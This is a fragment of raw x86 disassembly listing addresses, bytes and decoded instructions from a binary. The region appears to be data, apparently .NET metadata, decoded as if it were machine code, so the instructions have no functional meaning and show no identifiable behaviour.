  405cdb:	00 b6 06 3b 15 06    	add    %dh,0x6153b06(%esi)
  405ce1:	00 2e                	add    %ch,(%esi)
  405ce3:	12 61 02             	adc    0x2(%ecx),%ah
  405ce6:	0a 00                	or     (%eax),%al
  405ce8:	d4 06                	aam    $0x6
  405cea:	3b 15 06 00 60 1d    	cmp    0x1d600006,%edx
  405cf0:	55                   	push   %ebp
  405cf1:	00 16                	add    %dl,(%esi)
  405cf3:	00 fd                	add    %bh,%ch
  405cf5:	16                   	push   %ss
  405cf6:	e1 02                	loope  0x405cfa
  405cf8:	06                   	push   %es
  405cf9:	00 2f                	add    %ch,(%edi)
  405cfb:	0e                   	push   %cs
  405cfc:	55                   	push   %ebp
  405cfd:	00 06                	add    %al,(%esi)
  405cff:	00 71 06             	add    %dh,0x6(%ecx)
  405d02:	61                   	popa
  405d03:	02 06                	add    (%esi),%al
  405d05:	00 6e 0f             	add    %ch,0xf(%esi)
  405d08:	61                   	popa
  405d09:	02 06                	add    (%esi),%al
  405d0b:	00 07                	add    %al,(%edi)
  405d0d:	05 61 02 06 00       	add    $0x60261,%eax
  405d12:	75 14                	jne    0x405d28
  405d14:	61                   	popa
  405d15:	02 06                	add    (%esi),%al
  405d17:	00 24 12             	add    %ah,(%edx,%edx,1)
  405d1a:	61                   	popa
  405d1b:	02 16                	add    (%esi),%dl
  405d1d:	00 3d 12 5c 15 1a    	add    %bh,0x1a155c12
  405d23:	00 f4                	add    %dh,%ah
  405d25:	13 7d 1a             	adc    0x1a(%ebp),%edi
  405d28:	1a 00                	sbb    (%eax),%al
  405d2a:	79 11                	jns    0x405d3d
  405d2c:	7d 1a                	jge    0x405d48
  405d2e:	8b 01                	mov    (%ecx),%eax
  405d30:	ad                   	lods   %ds:(%esi),%eax
  405d31:	14 00                	adc    $0x0,%al
  405d33:	00 1a                	add    %bl,(%edx)
  405d35:	00 19                	add    %bl,(%ecx)
  405d37:	19 7d 1a             	sbb    %edi,0x1a(%ebp)
  405d3a:	06                   	push   %es
  405d3b:	00 34 15 ec 0f 06 00 	add    %dh,0x60fec(,%edx,1)
  405d42:	7a 00                	jp     0x405d44
  405d44:	ec                   	in     (%dx),%al
  405d45:	0f 06                	clts
  405d47:	00 e3                	add    %ah,%bl
  405d49:	0f ec 0f             	paddsb (%edi),%mm1
  405d4c:	06                   	push   %es
  405d4d:	00 da                	add    %bl,%dl
  405d4f:	00 ec                	add    %ch,%ah
  405d51:	0f 06                	clts
  405d53:	00 dc                	add    %bl,%ah
  405d55:	12 f6                	adc    %dh,%dh
  405d57:	1c 06                	sbb    $0x6,%al
  405d59:	00 2b                	add    %ch,(%ebx)
  405d5b:	10 f6                	adc    %dh,%dh
  405d5d:	1c 06                	sbb    $0x6,%al
  405d5f:	00 ac 07 ec 0f 06 00 	add    %ch,0x60fec(%edi,%eax,1)
  405d66:	7e 10                	jle    0x405d78
  405d68:	ec                   	in     (%dx),%al
  405d69:	0f 1e 00             	nopl   (%eax)
  405d6c:	22 11                	and    (%ecx),%dl
  405d6e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405d6f:	17                   	pop    %ss
  405d70:	06                   	push   %es
  405d71:	00 97 1d b6 0e 06    	add    %dl,0x60eb61d(%edi)
  405d77:	00 d0                	add    %dl,%al
  405d79:	0e                   	push   %cs
  405d7a:	b6 0e                	mov    $0xe,%dh
  405d7c:	06                   	push   %es
  405d7d:	00 7f 06             	add    %bh,0x6(%edi)
  405d80:	b6 0e                	mov    $0xe,%dh
  405d82:	06                   	push   %es
  405d83:	00 74 03 ec          	add    %dh,-0x14(%ebx,%eax,1)
  405d87:	0f 06                	clts
  405d89:	00 1f                	add    %bl,(%edi)
  405d8b:	06                   	push   %es
  405d8c:	96                   	xchg   %eax,%esi
  405d8d:	0b 0a                	or     (%edx),%ecx
  405d8f:	00 0d 14 55 00 0a    	add    %cl,0xa005514
  405d95:	00 91 18 55 00 06    	add    %dl,0x6005518(%ecx)
  405d9b:	00 d5                	add    %dl,%ch
  405d9d:	04 55                	add    $0x55,%al
  405d9f:	00 43 00             	add    %al,0x0(%ebx)
  405da2:	ea 14 00 00 12 00 a2 	ljmp   $0xa200,$0x12000014
  405da9:	05 b8 12 06 00       	add    $0x612b8,%eax
  405dae:	12 00                	adc    (%eax),%al
  405db0:	c6 02 06             	movb   $0x6,(%edx)
  405db3:	00 b0 10 ec 0f 06    	add    %dh,0x60fec10(%eax)
  405db9:	00 13                	add    %dl,(%ebx)
  405dbb:	1d 4d 11 06 00       	sbb    $0x6114d,%eax
  405dc0:	38 08                	cmp    %cl,(%eax)
  405dc2:	ec                   	in     (%dx),%al
  405dc3:	0f 06                	clts
  405dc5:	00 f5                	add    %dh,%ch
  405dc7:	14 ec                	adc    $0xec,%al
  405dc9:	0f 06                	clts
  405dcb:	00 fb                	add    %bh,%bl
  405dcd:	05 ec 0f 22 00       	add    $0x220fec,%eax
  405dd2:	4a                   	dec    %edx
  405dd3:	12 53 13             	adc    0x13(%ebx),%dl
  405dd6:	22 00                	and    (%eax),%al
  405dd8:	cb                   	lret
  405dd9:	16                   	push   %ss
  405dda:	53                   	push   %ebx
  405ddb:	13 22                	adc    (%edx),%esp
  405ddd:	00 7a 13             	add    %bh,0x13(%edx)
  405de0:	53                   	push   %ebx
  405de1:	13 12                	adc    (%edx),%edx
  405de3:	00 72 13             	add    %dh,0x13(%edx)
  405de6:	99                   	cltd
  405de7:	15 22 00 e3 16       	adc    $0x16e30022,%eax
  405dec:	53                   	push   %ebx
  405ded:	13 06                	adc    (%esi),%eax
  405def:	00 53 16             	add    %dl,0x16(%ebx)
  405df2:	f6 1c 06             	negb   (%esi,%eax,1)
  405df5:	00 e9                	add    %ch,%cl
  405df7:	11 ec                	adc    %ebp,%esp
  405df9:	0f 06                	clts
  405dfb:	00 5a 16             	add    %bl,0x16(%edx)
  405dfe:	f6 1c 12             	negb   (%edx,%edx,1)
  405e01:	00 0e                	add    %cl,(%esi)
  405e03:	13 f6                	adc    %esi,%esi
  405e05:	1c 06                	sbb    $0x6,%al
  405e07:	00 a2 0f f6 1c 06    	add    %ah,0x61cf60f(%edx)
  405e0d:	00 fb                	add    %bh,%bl
  405e0f:	00 f6                	add    %dh,%dh
  405e11:	1c 06                	sbb    $0x6,%al
  405e13:	00 d3                	add    %dl,%bl
  405e15:	11 ec                	adc    %ebp,%esp
  405e17:	0f 06                	clts
  405e19:	00 04 10             	add    %al,(%eax,%edx,1)
  405e1c:	f6 1c 06             	negb   (%esi,%eax,1)
  405e1f:	00 4c 05 f6          	add    %cl,-0xa(%ebp,%eax,1)
  405e23:	1c 06                	sbb    $0x6,%al
  405e25:	00 10                	add    %dl,(%eax)
  405e27:	05 f6 1c 06 00       	add    $0x61cf6,%eax
  405e2c:	45                   	inc    %ebp
  405e2d:	10 f6                	adc    %dh,%dh
  405e2f:	1c 06                	sbb    $0x6,%al
  405e31:	00 2b                	add    %ch,(%ebx)
  405e33:	05 f6 1c 06 00       	add    $0x61cf6,%eax
  405e38:	bc 11 f6 1c 06       	mov    $0x61cf611,%esp
  405e3d:	00 9b 13 ec 0f 06    	add    %bl,0x60fec13(%ebx)
  405e43:	00 89 1c ec 0f 06    	add    %cl,0x60fec1c(%ecx)
  405e49:	00 fd                	add    %bh,%ch
  405e4b:	17                   	pop    %ss
  405e4c:	99                   	cltd
  405e4d:	15 06 00 d8 05       	adc    $0x5d80006,%eax
  405e52:	ec                   	in     (%dx),%al
  405e53:	0f 06                	clts
  405e55:	00 2b                	add    %ch,(%ebx)
  405e57:	03 f6                	add    %esi,%esi
  405e59:	1c 06                	sbb    $0x6,%al
  405e5b:	00 c7                	add    %al,%bh
  405e5d:	00 ec                	add    %ch,%ah
  405e5f:	0f 06                	clts
  405e61:	00 c6                	add    %al,%dh
  405e63:	05 ec 0f 06 00       	add    $0x60fec,%eax
  405e68:	44                   	inc    %esp
  405e69:	06                   	push   %es
  405e6a:	ec                   	in     (%dx),%al
  405e6b:	0f 06                	clts
  405e6d:	00 2c 18             	add    %ch,(%eax,%ebx,1)
  405e70:	61                   	popa
  405e71:	02 06                	add    (%esi),%al
  405e73:	00 3d 08 61 02 0a    	add    %bh,0xa026108
  405e79:	00 af 0f 0c 11 0a    	add    %ch,0xa110c0f(%edi)
  405e7f:	00 3c 05 0c 11 00 00 	add    %bh,0x110c(,%eax,1)
  405e86:	00 00                	add    %al,(%eax)
  405e88:	45                   	inc    %ebp
  405e89:	01 00                	add    %eax,(%eax)
  405e8b:	00 00                	add    %al,(%eax)
  405e8d:	00 01                	add    %al,(%ecx)
  405e8f:	00 01                	add    %al,(%ecx)
  405e91:	00 01                	add    %al,(%ecx)
  405e93:	00 10                	add    %dl,(%eax)
  405e95:	00 c7                	add    %al,%bh
  405e97:	0f 76 1a             	pcmpeqd (%edx),%mm3
  405e9a:	05 00 01 00 01       	add    $0x1000100,%eax
  405e9f:	00 81 01 10 00 0f    	add    %al,0xf001001(%ecx)
  405ea5:	17                   	pop    %ss
  405ea6:	76 1a                	jbe    0x405ec2
  405ea8:	05 00 01 00 03       	add    $0x3000100,%eax
  405ead:	00 81 01 10 00 97    	add    %al,-0x68ffefff(%ecx)
  405eb3:	19 94 11 05 00 13 00 	sbb    %edx,0x130005(%ecx,%edx,1)
  405eba:	06                   	push   %es
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 aa 12 04 0f 05    	add    %ch,0x50f0412(%edx)
  405ec5:	00 1e                	add    %bl,(%esi)
  405ec7:	00 24 00             	add    %ah,(%eax,%eax,1)
  405eca:	00 00                	add    %al,(%eax)
  405ecc:	10 00                	adc    %al,(%eax)
  405ece:	2f                   	das
  405ecf:	17                   	pop    %ss
  405ed0:	33 14 05 00 1e 00 26 	xor    0x26001e00(,%eax,1),%edx
  405ed7:	00 81 01 10 00 86    	add    %al,-0x79ffefff(%ecx)
  405edd:	10 33                	adc    %dh,(%ebx)
  405edf:	14 05                	adc    $0x5,%al
  405ee1:	00 1e                	add    %bl,(%esi)
  405ee3:	00 2d 00 81 01 10    	add    %ch,0x10018100
  405ee9:	00 43 13             	add    %al,0x13(%ebx)
  405eec:	33 14 05 00 1e 00 2f 	xor    0x2f001e00(,%eax,1),%edx
  405ef3:	00 81 01 10 00 54    	add    %al,0x54001001(%ecx)
  405ef9:	15 33 14 05 00       	adc    $0x51433,%eax
  405efe:	1e                   	push   %ds
  405eff:	00 30                	add    %dh,(%eax)
  405f01:	00 81 01 10 00 53    	add    %al,0x53001001(%ecx)
  405f07:	0f 33                	rdpmc
  405f09:	14 05                	adc    $0x5,%al
  405f0b:	00 1e                	add    %bl,(%esi)
  405f0d:	00 36                	add    %dh,(%esi)
  405f0f:	00 81 01 10 00 4e    	add    %al,0x4e001001(%ecx)
  405f15:	15 33 14 05 00       	adc    $0x51433,%eax
  405f1a:	1f                   	pop    %ds
  405f1b:	00 38                	add    %bh,(%eax)
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 06                	add    %al,(%esi)
  405f23:	02 00                	add    (%eax),%al
  405f25:	00 39                	add    %bh,(%ecx)
  405f27:	00 1f                	add    %bl,(%edi)
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 94    	add    %al,-0x6bffefff(%ecx)
  405f31:	0e                   	push   %cs
  405f32:	33 14 05 00 23 00 3e 	xor    0x3e002300(,%eax,1),%edx
  405f39:	00 81 01 10 00 5d    	add    %al,0x5d001001(%ecx)
  405f3f:	1d 33 14 05 00       	sbb    $0x51433,%eax
  405f44:	23 00                	and    (%eax),%eax
  405f46:	41                   	inc    %ecx
  405f47:	00 81 01 10 00 90    	add    %al,-0x6fffefff(%ecx)
  405f4d:	19 72 19             	sbb    %esi,0x19(%edx)
  405f50:	05 00 24 00 46       	add    $0x46002400,%eax
  405f55:	00 83 01 10 00 80    	add    %al,-0x7fffefff(%ebx)
  405f5b:	00 00                	add    %al,(%eax)
  405f5d:	00 05 00 25 00 4b    	add    %al,0x4b002500
  405f63:	00 01                	add    %al,(%ecx)
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 0d 01 f3 0f 05    	add    %cl,0x50ff301
  405f6d:	00 26                	add    %ah,(%esi)
  405f6f:	00 4b 00             	add    %cl,0x0(%ebx)
  405f72:	81 01 10 00 06 01    	addl   $0x1060010,(%ecx)
  405f78:	f3 0f 05             	repz syscall
  405f7b:	00 2d 00 52 00 00    	add    %ch,0x5200
  405f81:	01 00                	add    %eax,(%eax)
  405f83:	00 5d 01             	add    %bl,0x1(%ebp)
  405f86:	00 00                	add    %al,(%eax)
  405f88:	05 00 2d 00 54       	add    $0x54002d00,%eax
  405f8d:	00 13                	add    %dl,(%ebx)
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 38                	add    %bh,(%eax)
  405f93:	00 00                	add    %al,(%eax)
  405f95:	00 51 00             	add    %dl,0x0(%ecx)
  405f98:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 99 17 bd 0d 05    	add    %bl,0x50dbd17(%ecx)
  405fa5:	00 2e                	add    %ch,(%esi)
  405fa7:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 56 10             	add    %dl,0x10(%esi)
  405fb0:	bd 0d 05 00 2f       	mov    $0x2f00050d,%ebp
  405fb5:	00 5f 00             	add    %bl,0x0(%edi)
  405fb8:	01 00                	add    %eax,(%eax)
  405fba:	10 00                	adc    %al,(%eax)
  405fbc:	63 1c bd 0d 05 00 31 	arpl   %ebx,0x3100050d(,%edi,4)
  405fc3:	00 63 00             	add    %ah,0x0(%ebx)
  405fc6:	01 00                	add    %eax,(%eax)
  405fc8:	10 00                	adc    %al,(%eax)
  405fca:	d8 0d bd 0d 05 00    	fmuls  0x50dbd
  405fd0:	33 00                	xor    (%eax),%eax
  405fd2:	6a 00                	push   $0x0
  405fd4:	01 01                	add    %eax,(%ecx)
  405fd6:	00 00                	add    %al,(%eax)
  405fd8:	11 08                	adc    %ecx,(%eax)
  405fda:	bd 0d 39 00 3a       	mov    $0x3a00390d,%ebp
  405fdf:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405fe5:	00 84 17 bd 0d 05 00 	add    %al,0x50dbd(%edi,%edx,1)
  405fec:	47                   	inc    %edi
  405fed:	00 95 00 00 00 10    	add    %dl,0x10000000(%ebp)
  405ff3:	00 8e 17 bd 0d 05    	add    %cl,0x50dbd17(%esi)
  405ff9:	00 47 00             	add    %al,0x0(%edi)
  405ffc:	99                   	cltd
  405ffd:	00 81 01 10 00 84    	add    %al,-0x7bffefff(%ecx)
  406003:	12 bd 0d 05 00 47    	adc    0x4700050d(%ebp),%bh
  406009:	00 a2 00 00 01 00    	add    %ah,0x10000(%edx)
  40600f:	00 4e 01             	add    %cl,0x1(%esi)
  406012:	00 00                	add    %al,(%eax)
  406014:	05 00 47 00 a4       	add    $0xa4004700,%eax
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 1b                	add    %bl,(%ebx)
  40601f:	01 00                	add    %eax,(%eax)
  406021:	00 51 00             	add    %dl,0x0(%ecx)
  406024:	48                   	dec    %eax
  406025:	00 a4 00 16 00 9e 18 	add    %ah,0x189e0016(%eax,%eax,1)
  40602c:	12 00                	adc    (%eax),%al
  40602e:	16                   	push   %ss
  40602f:	00 ab 18 12 00 16    	add    %ch,0x16001218(%ebx)
  406035:	00 04 11             	add    %al,(%ecx,%edx,1)
  406038:	12 00                	adc    (%eax),%al
  40603a:	16                   	push   %ss
  40603b:	00 0b                	add    %cl,(%ebx)
  40603d:	0f 12 00             	movlps (%eax),%xmm0
  406040:	16                   	push   %ss
  406041:	00 35 13 12 00 16    	add    %dh,0x16001213
  406047:	00 4b 06             	add    %cl,0x6(%ebx)
  40604a:	12 00                	adc    (%eax),%al
  40604c:	16                   	push   %ss
  40604d:	00 ed                	add    %ch,%ch
  40604f:	1c 12                	sbb    $0x12,%al
  406051:	00 16                	add    %dl,(%esi)
  406053:	00 9c 02 12 00 16 00 	add    %bl,0x160012(%edx,%eax,1)
  40605a:	a0 08 12 00 16       	mov    0x16001208,%al
  40605f:	00 53 08             	add    %dl,0x8(%ebx)
  406062:	12 00                	adc    (%eax),%al
  406064:	16                   	push   %ss
  406065:	00 9a 08 15 00 16    	add    %bl,0x16001508(%edx)
  40606b:	00 a1 0d 12 00 16    	add    %ah,0x1600120d(%ecx)
  406071:	00 14 01             	add    %dl,(%ecx,%eax,1)
  406074:	19 00                	sbb    %eax,(%eax)
  406076:	16                   	push   %ss
  406077:	00 cc                	add    %cl,%ah
  406079:	10 12                	adc    %dl,(%edx)
  40607b:	00 16                	add    %dl,(%esi)
  40607d:	00 70 02             	add    %dh,0x2(%eax)
  406080:	12 00                	adc    (%eax),%al
  406082:	16                   	push   %ss
  406083:	00 79 03             	add    %bh,0x3(%ecx)
  406086:	12 00                	adc    (%eax),%al
  406088:	16                   	push   %ss
  406089:	00 42 1c             	add    %al,0x1c(%edx)
  40608c:	12 00                	adc    (%eax),%al
  40608e:	16                   	push   %ss
  40608f:	00 a4 12 12 00 11 00 	add    %ah,0x110012(%edx,%edx,1)
  406096:	85 04 21             	test   %eax,(%ecx,%eiz,1)
  406099:	00 11                	add    %dl,(%ecx)
  40609b:	00 6a 04             	add    %ch,0x4(%edx)
  40609e:	25 00 11 00 3a       	and    $0x3a001100,%eax
  4060a3:	04 29                	add    $0x29,%al
  4060a5:	00 11                	add    %dl,(%ecx)
  4060a7:	00 d0                	add    %dl,%al
  4060a9:	03 2d 00 11 00 52    	add    0x52001100,%ebp
  4060af:	04 2d                	add    $0x2d,%al
  4060b1:	00 11                	add    %dl,(%ecx)
  4060b3:	00 b5 03 30 00 11    	add    %dh,0x11003003(%ebp)
  4060b9:	00 98 03 34 00 31    	add    %bl,0x31003403(%eax)
  4060bf:	00 7e 03             	add    %bh,0x3(%esi)
  4060c2:	37                   	aaa
  4060c3:	00 11                	add    %dl,(%ecx)
  4060c5:	00 ec                	add    %ch,%ah
  4060c7:	03 30                	add    (%eax),%esi
  4060c9:	00 11                	add    %dl,(%ecx)
  4060cb:	00 20                	add    %ah,(%eax)
  4060cd:	04 3a                	add    $0x3a,%al
  4060cf:	00 11                	add    %dl,(%ecx)
  4060d1:	00 02                	add    %al,(%edx)
  4060d3:	04 34                	add    $0x34,%al
  4060d5:	00 16                	add    %dl,(%esi)
  4060d7:	00 88 12 dc 00 06    	add    %cl,0x600dc12(%eax)
  4060dd:	06                   	push   %es
  4060de:	a0 02 06 01 56       	mov    0x56010602,%al
  4060e3:	80 75 02 09          	xorb   $0x9,0x2(%ebp)
  4060e7:	01 56 80             	add    %edx,-0x80(%esi)
  4060ea:	d3 01                	roll   %cl,(%ecx)
  4060ec:	09 01                	or     %eax,(%ecx)
  4060ee:	56                   	push   %esi
  4060ef:	80 c0 01             	add    $0x1,%al
  4060f2:	09 01                	or     %eax,(%ecx)
  4060f4:	31 00                	xor    %eax,(%eax)
  4060f6:	03 02                	add    (%edx),%eax
  4060f8:	12 00                	adc    (%eax),%al
  4060fa:	16                   	push   %ss
  4060fb:	00 4d 17             	add    %cl,0x17(%ebp)
  4060fe:	30 01                	xor    %al,(%ecx)
  406100:	16                   	push   %ss
  406101:	00 0b                	add    %cl,(%ebx)
  406103:	00 43 01             	add    %al,0x1(%ebx)
  406106:	51                   	push   %ecx
  406107:	80 93 0d 3a 00 51 80 	adcb   $0x80,0x51003a0d(%ebx)
  40610e:	8f                   	(bad)
  40610f:	0d 3a 00 51 80       	or     $0x8051003a,%eax
  406114:	86 0d 3a 00 51 80    	xchg   %cl,0x8051003a
  40611a:	6a 0d                	push   $0xd
  40611c:	3a 00                	cmp    (%eax),%al
  40611e:	21 00                	and    %eax,(%eax)
  406120:	f1                   	int1
  406121:	1c 29                	sbb    $0x29,%al
  406123:	00 21                	add    %ah,(%ecx)
  406125:	00 d2                	add    %dl,%dl
  406127:	1c 29                	sbb    $0x29,%al
  406129:	00 31                	add    %dh,(%ecx)
  40612b:	00 f2                	add    %dh,%dl
  40612d:	19 29                	sbb    %ebp,(%ecx)
  40612f:	00 33                	add    %dh,(%ebx)
  406131:	01 7c 01 8b          	add    %edi,-0x75(%ecx,%eax,1)
  406135:	01 11                	add    %edx,(%ecx)
  406137:	00 62 05             	add    %ah,0x5(%edx)
  40613a:	8f 01                	pop    (%ecx)
  40613c:	01 00                	add    %eax,(%eax)
  40613e:	92                   	xchg   %eax,%edx
  40613f:	10 30                	adc    %dh,(%eax)
  406141:	01 01                	add    %eax,(%ecx)
  406143:	00 b3 11 3a 00 01    	add    %dh,0x1003a11(%ebx)
  406149:	00 92 10 30 01 01    	add    %dl,0x1013010(%edx)
  40614f:	00 2d 14 c7 01 01    	add    %ch,0x101c714
  406155:	00 a7 07 12 00 01    	add    %ah,0x1001207(%edi)
  40615b:	00 87 07 12 00 01    	add    %al,0x1001207(%edi)
  406161:	00 a9 0a 37 00 01    	add    %ch,0x100370a(%ecx)
  406167:	00 07                	add    %al,(%edi)
  406169:	08 02                	or     %al,(%edx)
  40616b:	02 01                	add    (%ecx),%al
  40616d:	00 9b 1a c7 01 01    	add    %bl,0x101c71a(%ebx)
  406173:	00 92 10 30 01 01    	add    %dl,0x1013010(%edx)
  406179:	00 84 1c 06 02 06 06 	add    %al,0x6060206(%esp,%ebx,1)
  406180:	a0 02 3a 00 56       	mov    0x56003a02,%al
  406185:	80 fb 11             	cmp    $0x11,%bl
  406188:	02 02                	add    (%edx),%al
  40618a:	56                   	push   %esi
  40618b:	80 4e 0f 02          	orb    $0x2,0xf(%esi)
  40618f:	02 56 80             	add    -0x80(%esi),%dl
  406192:	73 12                	jae    0x4061a6
  406194:	02 02                	add    (%edx),%al
  406196:	56                   	push   %esi
  406197:	80 89 1c 02 02 56 80 	orb    $0x80,0x5602021c(%ecx)
  40619e:	c1 0c 02 02          	rorl   $0x2,(%edx,%eax,1)
  4061a2:	56                   	push   %esi
  4061a3:	80 dd 13             	sbb    $0x13,%ch
  4061a6:	02 02                	add    (%edx),%al
  4061a8:	56                   	push   %esi
  4061a9:	80 c7 00             	add    $0x0,%bh
  4061ac:	02 02                	add    (%edx),%al
  4061ae:	56                   	push   %esi
  4061af:	80 7e 10 02          	cmpb   $0x2,0x10(%esi)
  4061b3:	02 56 80             	add    -0x80(%esi),%dl
  4061b6:	08 19                	or     %bl,(%ecx)
  4061b8:	02 02                	add    (%edx),%al
  4061ba:	56                   	push   %esi
  4061bb:	80 44 06 02 02       	addb   $0x2,0x2(%esi,%eax,1)
  4061c0:	56                   	push   %esi
  4061c1:	80 ac 07 02 02 56 80 	subb   $0x42,-0x7fa9fdfe(%edi,%eax,1)
  4061c8:	42 
  4061c9:	1d 02 02 33 01       	sbb    $0x1330202,%eax
  4061ce:	16                   	push   %ss
  4061cf:	02 fd                	add    %ch,%bh
  4061d1:	02 08                	add    (%eax),%cl
  4061d3:	26 00 00             	add    %al,%es:(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 9b 10 0a 00 01    	add    %bl,0x1000a10(%ebx)
  4061df:	00 78 20             	add    %bh,0x20(%eax)
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	ff 14 0e             	call   *(%esi,%ecx,1)
  4061eb:	00 01                	add    %al,(%ecx)
  4061ed:	00 f8                	add    %bh,%al
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 05 17 1d 00 01    	add    %al,0x1001d17
  4061fb:	00 50 28             	add    %dl,0x28(%eax)
  4061fe:	00 00                	add    %al,(%eax)
  406200:	00 00                	add    %al,(%eax)
  406202:	91                   	xchg   %eax,%ecx
  406203:	00 35 0d 1d 00 01    	add    %dh,0x1001d0d
  406209:	00 c0                	add    %al,%al
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 05 15 0a    	add    %dl,0xa150518(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 4c 1a 3d    	add    %dl,0x3d1a4c08(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 5a 1a 42    	add    %dl,0x421a5a08(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 30 1a 48    	add    %dl,0x481a3008(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 3e 1a 4d    	add    %dl,0x4d1a3e08(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 8c 13 53    	add    %dl,0x53138c08(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 97 13 58    	add    %dl,0x58139708(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 14 0b 5e    	add    %dl,0x5e0b1408(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 23                	or     %ah,(%ebx)
  406283:	0b 62 00             	or     0x0(%edx),%esp
  406286:	04 00                	add    $0x0,%al
  406288:	bc 20 00 00 00       	mov    $0x20,%esp
  40628d:	00 91 08 c9 19 5e    	add    %dl,0x5e19c908(%ecx)
  406293:	00 05 00 c3 20 00    	add    %al,0x20c300
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 d4 19 62    	add    %dl,0x6219d408(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 cc 0a 67    	add    %dl,0x670acc08(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 da 0a 6c    	add    %dl,0x6c0ada08(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 47 03 1d    	add    %dl,0x1d034708(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 57 03 72    	add    %dl,0x72035708(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 f7 02 77    	add    %dl,0x7702f708(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 84 0b 67    	add    %dl,0x670b8408(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 8d 0b 6c    	add    %dl,0x6c0b8d08(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 ea 0e 7b    	add    %dl,0x7b0eea08(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 f7 0e 7f    	add    %dl,0x7f0ef708(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 e1 0c 1d    	add    %dl,0x1d0ce108(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 f2 0c 72    	add    %dl,0x720cf208(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 1f 1a 0a    	add    %dl,0xa1a1f00(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 68 07 84    	add    %dl,-0x7bf89800(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
